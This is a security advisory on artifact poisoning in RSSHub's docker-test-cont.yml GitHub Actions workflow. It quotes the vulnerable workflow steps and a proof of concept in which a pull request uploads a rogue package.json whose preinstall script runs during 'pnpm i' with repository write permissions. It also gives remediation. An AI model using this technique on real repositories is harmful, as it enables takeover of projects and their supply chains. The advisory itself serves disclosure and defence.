# RSSHub's `docker-test-cont.yml` workflow is vulnerable to Artifact Poisoning which may lead to a full repository takeover.

## Description

### Artifact Poisoning in `docker-test-cont.yml` workflow. (`GHSL-2024-178`)

The [`docker-test-cont.yml` workflow](https://github.com/DIYgod/RSSHub/blob/e08733f94c81440d19ee6a5fd5e915e9a65395f5/.github/workflows/docker-test-cont.yml) gets triggered when the `PR - Docker build test` workflow completes successfully:

```
on:
  workflow_run:
    workflows: [PR - Docker build test] # open, reopen, synchronized, edited included
    types: [completed]
```

It then collects some information about the Pull Request that triggered the triggering workflow and set some labels depending on the PR body and sender. If the PR also contains a `routes` markdown block, it will set the `TEST_CONTINUE` environment variable to `true`.

The workflow then downloads and extracts an artifact uploaded by the triggering workflow which is expected to contain a single `rsshub.tar.zst` file. However, this is not validates and the contents are extracted in the root of the workspace overriding any existing files:

```
- name: Fetch Docker image
  if: (env.TEST_CONTINUE)
  uses: dawidd6/action-download-artifact@v6
  with:
    workflow: ${{ github.event.workflow_run.workflow_id }}
    run_id: ${{ github.event.workflow_run.id }}
    name: docker-image
```

After a few steps, the workflow installs the pnpm dependencies with:

```
- name: Install dependencies (pnpm) # require js-beautify
  if: (env.TEST_CONTINUE)
  run: pnpm i
```

Since the contents of the artifact have not been validated, it is possible for a malicious actor to send a Pull Request which uploads, not just the `rsshub.tar.zst` compressed docker image, but also a malicious `package.json` file with a script to run arbitrary code in the context of the [privileged workflow](https://github.com/DIYgod/RSSHub/actions/runs/10141104413/job/28037643579#step:1:17).

#### PoC

* Clone the repository
* Modify [`docker-test.yml`](https://github.com/DIYgod/RSSHub/blob/e08733f94c81440d19ee6a5fd5e915e9a65395f5/.github/workflows/docker-test.yml) workflow. Keep the original content but perform the following modifications:
  + Add the following step before the upload artifact step:

```
- name: Test Docker image
  run: bash scripts/docker/test-docker.sh

- name: Export Docker image
  run: |
    mkdir payload
    cd payload
    docker save rsshub:latest | zstdmt -o rsshub.tar.zst
    cat <<EOF > package.json
    ADD HERE THE CONTENTS OF THE ORIGINAL PACKAGE.JSON (ommitted for clarity) AND ADD A NEW PREINSTALL SCRIPT:
        `"preinstall": "echo COMPROMISED",`
    EOF

- name: Upload Docker image
  uses: actions/upload-artifact@v4
  with:
    name: docker-image
    path: payload
    retention-days: 1
```

* Create a Pull Request and add a valid `routes` comment in the body of the Pull Request
* Watch the execution of the vulnerable workflow log and look for the word `COMPROMISED` in it.

#### Impact

The workflow runs with [full-write privieges](https://github.com/DIYgod/RSSHub/actions/runs/10141104413/job/28037643579#step:1:17) which may allow a malicious actor to take over the Repository:

```
  Actions: write
  Attestations: write
  Checks: write
  Contents: write
  Deployments: write
  Discussions: write
  Issues: write
  Metadata: read
  Packages: write
  Pages: write
  PullRequests: write
  RepositoryProjects: write
  SecurityEvents: write
  Statuses: write

```
#### Remediation

Extract the artifact to a temporary directory and validate its contents.
